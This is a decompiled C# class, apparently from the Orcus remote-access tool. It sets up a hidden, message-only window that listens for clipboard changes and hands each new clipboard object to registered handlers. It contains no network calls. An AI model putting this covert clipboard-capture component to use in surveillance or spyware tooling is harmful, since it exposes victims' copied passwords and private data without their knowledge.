using System;
using System.ComponentModel;
using System.Threading;
using System.Windows.Forms;
using Orcus.Native;
using Orcus.Shared.Commands.ClipboardManager;

namespace Orcus.Utilities;

public sealed class ClipboardNotification
{
	public delegate void OnClipboardChangeEventHandler(ClipboardFormat? format, IDataObject data);

	private class NotificationForm : Form
	{
		private static readonly IntPtr HWND_MESSAGE = new IntPtr(-3);

		public NotificationForm()
		{
			NativeMethods.SetParent(((Control)this).get_Handle(), HWND_MESSAGE);
			NativeMethods.AddClipboardFormatListener(((Control)this).get_Handle());
		}

		protected override void SetVisibleCore(bool value)
		{
			_form = this;
			((Form)this).SetVisibleCore(false);
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() == 797)
			{
				OnClipboardUpdate(null);
			}
			((Form)this).WndProc(ref m);
		}

		protected override void OnClosing(CancelEventArgs e)
		{
			((Form)this).OnClosing(e);
			NativeMethods.RemoveClipboardFormatListener(((Control)this).get_Handle());
		}
	}

	private static OnClipboardChangeEventHandler _clipboardChangeEventHandler;

	private static readonly object EventLock = new object();

	private static NotificationForm _form;

	private static readonly string[] Formats = Enum.GetNames(typeof(ClipboardFormat));

	public static event OnClipboardChangeEventHandler ClipboardUpdate
	{
		add
		{
			lock (EventLock)
			{
				if (_clipboardChangeEventHandler == null)
				{
					Thread thread = new Thread((ThreadStart)delegate
					{
						Application.Run((Form)(object)new NotificationForm());
					});
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
				}
				_clipboardChangeEventHandler = (OnClipboardChangeEventHandler)Delegate.Combine(_clipboardChangeEventHandler, value);
			}
		}
		remove
		{
			lock (EventLock)
			{
				_clipboardChangeEventHandler = (OnClipboardChangeEventHandler)Delegate.Remove(_clipboardChangeEventHandler, value);
				if (_clipboardChangeEventHandler == null)
				{
					((Control)_form).Invoke((Delegate)(Action)delegate
					{
						((Form)_form).Close();
					});
					((Component)(object)_form).Dispose();
					_form = null;
				}
			}
		}
	}

	private static void OnClipboardUpdate(EventArgs e)
	{
		IDataObject dataObject = Clipboard.GetDataObject();
		if (dataObject == null)
		{
			_clipboardChangeEventHandler?.Invoke(null, null);
			return;
		}
		ClipboardFormat? clipboardFormat = GetClipboardFormat(dataObject);
		if (!clipboardFormat.HasValue)
		{
			_clipboardChangeEventHandler?.Invoke(null, null);
		}
		else
		{
			_clipboardChangeEventHandler?.Invoke(clipboardFormat, dataObject);
		}
	}

	public static ClipboardFormat? GetClipboardFormat(IDataObject dataObject)
	{
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		string[] formats = Formats;
		int num = 0;
		string text;
		while (true)
		{
			if (num < formats.Length)
			{
				text = formats[num];
				if (dataObject.GetDataPresent(text))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return (ClipboardFormat)Enum.Parse(typeof(ClipboardFormat), text);
	}
}
